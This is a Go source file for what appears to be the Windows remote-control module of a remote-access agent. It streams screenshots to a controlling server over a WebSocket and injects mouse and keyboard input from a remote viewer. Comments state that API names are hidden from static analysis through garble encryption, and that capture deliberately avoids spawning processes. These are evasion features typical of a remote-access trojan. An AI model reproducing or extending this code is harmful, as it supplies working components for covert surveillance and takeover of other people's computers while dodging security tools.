//go:build windows

package remote

import (
        "bytes"
        "context"
        "encoding/binary"
        "fmt"
        "image"
        "image/jpeg"
        "log"
        "sync"
        "time"
        "unsafe"

        "golang.org/x/sys/windows"
)

// All Win32 proc handles are resolved lazily on first use (not at package
// init) so their API name strings live inside function bodies where garble
// -literals gives them stronger per-build encryption, and static analysis
// cannot associate them with the binary at import time.
var (
        captureMu   sync.Mutex
        screenOnce  sync.Once
        inputOnce   sync.Once

        procGetSystemMetrics       *windows.LazyProc
        procGetDC                  *windows.LazyProc
        procReleaseDC              *windows.LazyProc
        procCreateCompatibleDC     *windows.LazyProc
        procCreateCompatibleBitmap *windows.LazyProc
        procSelectObject           *windows.LazyProc
        procBitBlt                 *windows.LazyProc
        procDeleteObject           *windows.LazyProc
        procDeleteDC               *windows.LazyProc
        procGetDIBits              *windows.LazyProc
        procSendInput              *windows.LazyProc
)

func ensureScreenAPIs() {
        screenOnce.Do(func() {
                u32 := windows.NewLazySystemDLL("user32.dll")
                g32 := windows.NewLazySystemDLL("gdi32.dll")
                procGetSystemMetrics       = u32.NewProc("GetSystemMetrics")
                procGetDC                  = u32.NewProc("GetDC")
                procReleaseDC              = u32.NewProc("ReleaseDC")
                procCreateCompatibleDC     = g32.NewProc("CreateCompatibleDC")
                procCreateCompatibleBitmap = g32.NewProc("CreateCompatibleBitmap")
                procSelectObject           = g32.NewProc("SelectObject")
                procBitBlt                 = g32.NewProc("BitBlt")
                procDeleteObject           = g32.NewProc("DeleteObject")
                procDeleteDC               = g32.NewProc("DeleteDC")
                procGetDIBits              = g32.NewProc("GetDIBits")
        })
}

func ensureInputAPIs() {
        inputOnce.Do(func() {
                u32 := windows.NewLazySystemDLL("user32.dll")
                procSendInput = u32.NewProc("SendInput")
        })
}

const (
        smCxScreen = 0
        smCyScreen = 1
        srccopy    = 0x00CC0020
        dibRGB     = 0
        biRGB      = 0

        inputMouse    = 0
        inputKeyboard = 1

        mevMove       = 0x0001
        mevLeftDown   = 0x0002
        mevLeftUp     = 0x0004
        mevRightDown  = 0x0008
        mevRightUp    = 0x0010
        mevMiddleDown = 0x0020
        mevMiddleUp   = 0x0040
        mevWheel      = 0x0800
        mevAbsolute   = 0x8000

        kevKeyUp   = 0x0002
        kevUnicode = 0x0004

        vkControl = 0x11
        vkMenu    = 0x12
        vkShift   = 0x10
        vkDelete  = 0x2E

        wheelDeltaConst = 120
)

// bitmapInfoHeader mirrors BITMAPINFOHEADER (always 40 bytes, no alignment issues).
type bitmapInfoHeader struct {
        Size          uint32
        Width         int32
        Height        int32
        Planes        uint16
        BitCount      uint16
        Compression   uint32
        SizeImage     uint32
        XPelsPerMeter int32
        YPelsPerMeter int32
        ClrUsed       uint32
        ClrImportant  uint32
}

// captureScreen takes a screenshot of the primary display and returns JPEG bytes + screen size.
func captureScreen(quality int) ([]byte, int, int, error) {
        ensureScreenAPIs()
        captureMu.Lock()
        defer captureMu.Unlock()

        w, _, _ := procGetSystemMetrics.Call(smCxScreen)
        h, _, _ := procGetSystemMetrics.Call(smCyScreen)
        width, height := int(w), int(h)
        if width <= 0 || height <= 0 {
                return nil, 0, 0, fmt.Errorf("GetSystemMetrics: invalid dimensions %dx%d", width, height)
        }

        hDC, _, _ := procGetDC.Call(0)
        if hDC == 0 {
                return nil, 0, 0, fmt.Errorf("GetDC(0) failed")
        }
        defer procReleaseDC.Call(0, hDC)

        memDC, _, _ := procCreateCompatibleDC.Call(hDC)
        if memDC == 0 {
                return nil, 0, 0, fmt.Errorf("CreateCompatibleDC failed")
        }
        defer procDeleteDC.Call(memDC)

        bmp, _, _ := procCreateCompatibleBitmap.Call(hDC, uintptr(width), uintptr(height))
        if bmp == 0 {
                return nil, 0, 0, fmt.Errorf("CreateCompatibleBitmap failed")
        }
        defer procDeleteObject.Call(bmp)

        old, _, _ := procSelectObject.Call(memDC, bmp)
        defer func() { procSelectObject.Call(memDC, old) }()

        ret, _, _ := procBitBlt.Call(
                memDC, 0, 0, uintptr(width), uintptr(height),
                hDC, 0, 0, srccopy,
        )
        if ret == 0 {
                return nil, 0, 0, fmt.Errorf("BitBlt failed")
        }

        bih := bitmapInfoHeader{
                Size:        40,
                Width:       int32(width),
                Height:      -int32(height), // negative = top-down DIB
                Planes:      1,
                BitCount:    32,
                Compression: biRGB,
        }

        pixels := make([]byte, width*height*4)
        n, _, _ := procGetDIBits.Call(
                memDC, bmp, 0, uintptr(height),
                uintptr(unsafe.Pointer(&pixels[0])),
                uintptr(unsafe.Pointer(&bih)),
                dibRGB,
        )
        if n == 0 {
                return nil, 0, 0, fmt.Errorf("GetDIBits returned 0 scan lines")
        }

        // Windows GDI returns BGRA; convert to RGBA for image.RGBA.
        img := image.NewRGBA(image.Rect(0, 0, width, height))
        for i := 0; i < len(pixels); i += 4 {
                img.Pix[i]   = pixels[i+2] // R ← was B slot
                img.Pix[i+1] = pixels[i+1] // G
                img.Pix[i+2] = pixels[i]   // B ← was R slot
                img.Pix[i+3] = 0xFF        // A
        }

        if quality <= 0 || quality > 100 {
                quality = 35
        }
        var buf bytes.Buffer
        if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
                return nil, 0, 0, fmt.Errorf("jpeg encode: %w", err)
        }
        return buf.Bytes(), width, height, nil
}

// SendFn is the callback used by StartCapture to deliver frames to the agent's WS connection.
type SendFn func(msg map[string]interface{}) error

// TakeScreenshot captures the primary display and returns JPEG bytes at the
// requested quality (1-100; 0 falls back to 50). This is the exported entry
// point for on-demand screenshot requests from the server — it uses the same
// native Win32 GDI/BitBlt path as the remote-desktop streaming loop, never
// invoking PowerShell or any external process.
func TakeScreenshot(quality int) (data []byte, width, height int, err error) {
        if quality <= 0 || quality > 100 {
                quality = 50
        }
        return captureScreen(quality)
}

// StartCapture runs a capture loop; each frame is passed to send as a remote_frame message.
// It blocks until ctx is cancelled.
func StartCapture(ctx context.Context, send SendFn, quality, fps int) {
        if fps <= 0 || fps > 30 {
                fps = 8
        }
        interval := time.Duration(1000/fps) * time.Millisecond
        ticker := time.NewTicker(interval)
        defer ticker.Stop()

        for {
                select {
                case <-ctx.Done():
                        return
                case <-ticker.C:
                        jpegData, w, h, err := captureScreen(quality)
                        if err != nil {
                                log.Printf("[remote] captureScreen: %v", err)
                                continue
                        }
                        if err2 := send(map[string]interface{}{
                                "type":   "remote_frame",
                                "data":   jpegData,
                                "width":  w,
                                "height": h,
                                "ts":     time.Now().UnixMilli(),
                        }); err2 != nil {
                                return // WS write failed — stop loop
                        }
                }
        }
}

// HandleInput processes an incoming remote_input envelope from the browser viewer.
func HandleInput(envelope map[string]interface{}) {
        event, _ := envelope["event"].(string)
        switch event {
        case "mouse":
                handleMouseInput(envelope)
        case "key":
                handleKeyInput(envelope)
        case "ctrl_alt_del":
                // Ctrl+Alt+Del cannot truly be injected via SendInput on Vista+
                // (it's handled by the security attention sequence at the kernel level).
                // Send the VK sequence anyway — on a locked workstation this does nothing;
                // on an active desktop it may open the task manager shortcut screen.
                sendKey(vkControl, 0)
                sendKey(vkMenu, 0)
                sendKey(vkDelete, 0)
                time.Sleep(50 * time.Millisecond)
                sendKeyUp(vkDelete, 0)
                sendKeyUp(vkMenu, 0)
                sendKeyUp(vkControl, 0)
        }
}

func handleMouseInput(env map[string]interface{}) {
        action, _ := env["action"].(string)
        xf := toFloat64(env["x"])
        yf := toFloat64(env["y"])

        // Normalised 0.0–1.0 → absolute 0–65535
        absX := int32(xf * 65535.0)
        absY := int32(yf * 65535.0)

        switch action {
        case "move":
                sendMouseAbs(mevMove|mevAbsolute, 0, absX, absY)
        case "down":
                btn, _ := env["button"].(string)
                flags := uint32(mevMove | mevAbsolute)
                switch btn {
                case "right":
                        flags |= mevRightDown
                case "middle":
                        flags |= mevMiddleDown
                default:
                        flags |= mevLeftDown
                }
                sendMouseAbs(flags, 0, absX, absY)
        case "up":
                btn, _ := env["button"].(string)
                flags := uint32(mevMove | mevAbsolute)
                switch btn {
                case "right":
                        flags |= mevRightUp
                case "middle":
                        flags |= mevMiddleUp
                default:
                        flags |= mevLeftUp
                }
                sendMouseAbs(flags, 0, absX, absY)
        case "dblclick":
                sendMouseAbs(mevMove|mevAbsolute|mevLeftDown, 0, absX, absY)
                sendMouseAbs(mevMove|mevAbsolute|mevLeftUp, 0, absX, absY)
                time.Sleep(50 * time.Millisecond)
                sendMouseAbs(mevMove|mevAbsolute|mevLeftDown, 0, absX, absY)
                sendMouseAbs(mevMove|mevAbsolute|mevLeftUp, 0, absX, absY)
        case "wheel":
                delta := toInt(env["delta"])
                wheelData := uint32(int32(delta) * wheelDeltaConst)
                sendMouseAbs(mevWheel|mevAbsolute, wheelData, absX, absY)
        }
}

func handleKeyInput(env map[string]interface{}) {
        action, _ := env["action"].(string)
        switch action {
        case "down":
                vk := uint16(toInt(env["vk"]))
                if vk == 0 {
                        return
                }
                ctrl, _  := env["ctrl"].(bool)
                alt, _   := env["alt"].(bool)
                shift, _ := env["shift"].(bool)
                if ctrl  { sendKey(vkControl, 0) }
                if alt   { sendKey(vkMenu, 0) }
                if shift { sendKey(vkShift, 0) }
                sendKey(vk, 0)

        case "up":
                vk := uint16(toInt(env["vk"]))
                if vk == 0 {
                        return
                }
                sendKeyUp(vk, 0)
                // Release any held modifiers
                sendKeyUp(vkControl, 0)
                sendKeyUp(vkMenu, 0)
                sendKeyUp(vkShift, 0)

        case "char":
                ch, _ := env["char"].(string)
                for _, r := range ch {
                        sendKeyboardRaw(0, uint16(r), kevUnicode)
                        sendKeyboardRaw(0, uint16(r), kevUnicode|kevKeyUp)
                }

        case "combo":
                // Ctrl/Alt+key shortcut
                vk := uint16(toInt(env["vk"]))
                if vk == 0 {
                        return
                }
                ctrl, _  := env["ctrl"].(bool)
                alt, _   := env["alt"].(bool)
                shift, _ := env["shift"].(bool)
                if ctrl  { sendKey(vkControl, 0) }
                if alt   { sendKey(vkMenu, 0) }
                if shift { sendKey(vkShift, 0) }
                sendKey(vk, 0)
                sendKeyUp(vk, 0)
                if shift { sendKeyUp(vkShift, 0) }
                if alt   { sendKeyUp(vkMenu, 0) }
                if ctrl  { sendKeyUp(vkControl, 0) }
        }
}

// ── Win32 SendInput wrappers ──────────────────────────────────────────────
//
// INPUT struct layout on 64-bit Windows (total 40 bytes):
//   [0-3]   DWORD type
//   [4-7]   padding (for 8-byte alignment of ULONG_PTR in union)
//   union starts at [8]:
//     MOUSEINPUT:  dx[8-11] dy[12-15] mouseData[16-19] dwFlags[20-23] time[24-27] pad[28-31] extra[32-39]
//     KEYBDINPUT:  wVk[8-9] wScan[10-11] dwFlags[12-15] time[16-19] pad[20-23] pad[24-31] extra[32-39]

func sendMouseAbs(flags, mouseData uint32, dx, dy int32) {
        ensureInputAPIs()
        var inp [40]byte
        binary.LittleEndian.PutUint32(inp[0:], inputMouse)
        binary.LittleEndian.PutUint32(inp[8:], uint32(dx))
        binary.LittleEndian.PutUint32(inp[12:], uint32(dy))
        binary.LittleEndian.PutUint32(inp[16:], mouseData)
        binary.LittleEndian.PutUint32(inp[20:], flags)
        procSendInput.Call(1, uintptr(unsafe.Pointer(&inp[0])), 40)
}

func sendKey(vk uint16, scan uint16) {
        sendKeyboardRaw(vk, scan, 0)
}

func sendKeyUp(vk uint16, scan uint16) {
        sendKeyboardRaw(vk, scan, kevKeyUp)
}

func sendKeyboardRaw(vk, scan uint16, flags uint32) {
        ensureInputAPIs()
        var inp [40]byte
        binary.LittleEndian.PutUint32(inp[0:], inputKeyboard)
        binary.LittleEndian.PutUint16(inp[8:], vk)
        binary.LittleEndian.PutUint16(inp[10:], scan)
        binary.LittleEndian.PutUint32(inp[12:], flags)
        procSendInput.Call(1, uintptr(unsafe.Pointer(&inp[0])), 40)
}

// ── Type helpers ──────────────────────────────────────────────────────────

func toFloat64(v interface{}) float64 {
        switch val := v.(type) {
        case float64:
                return val
        case float32:
                return float64(val)
        case int64:
                return float64(val)
        case uint64:
                return float64(val)
        case int:
                return float64(val)
        }
        return 0
}

func toInt(v interface{}) int {
        switch val := v.(type) {
        case int64:
                return int(val)
        case uint64:
                return int(val)
        case float64:
                return int(val)
        case int:
                return val
        }
        return 0
}
